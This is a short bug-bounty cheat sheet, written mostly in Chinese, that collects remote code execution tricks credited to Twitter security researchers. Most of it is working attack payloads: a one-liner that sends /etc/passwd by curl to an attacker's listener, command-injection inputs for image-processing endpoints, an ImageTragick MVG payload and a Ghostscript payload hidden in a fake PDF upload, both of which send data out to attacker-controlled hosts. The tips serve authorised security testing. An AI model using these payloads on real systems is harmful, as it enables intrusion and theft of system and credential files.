# RCE BugBountyTips

### Remote Code Execution (RCE):

1.[@rvismit](https://twitter.com/rvismit/status/1090125125461200896)：如果服务器仅允许GET和POST方法，可以尝试添加“X-HTTP-Method -Override: PUT"以通过PUT方法实现RCE。

2.[@Random_Robbie](https://twitter.com/Random_Robbie/status/992174798699679751)：Blind RCE - Grabs /etc/passwd 并通过POST将其转储到您的netcat.

```bash
`cat /etc/passwd | curl -X POST -d @- http://yourip:yourport/`
```

3.@prateek_0490:找到一个正在处理图像的端点？试一下:

```bash
> request=input&&id , request=input|id , request=input`id` or you can even setup a NC & try request=input&&http://wgetyourserver.com:port & so on.
```

4.@LooseSecurity:如果您能够在服务器上运行任意Python代码，请尝试运行以下命令获取RCE,用任意数量的Shell命令替换"ls"：

```python
import os;os.system("ls");
```

5.@TakSec:Recon to RCE:

```bash
Google "upload" site:”target" -> upload form -> ImageTragick MVG -> RCE
PoC:
push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
```

6.@huntmost:RCE on PDF upload:

```bash
Content-Disposition: form-data; name="fileToUpload"; filename="pwn.pdf"
Content-Type: application/pdf
%!PS
currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
.putdeviceparams
quit
```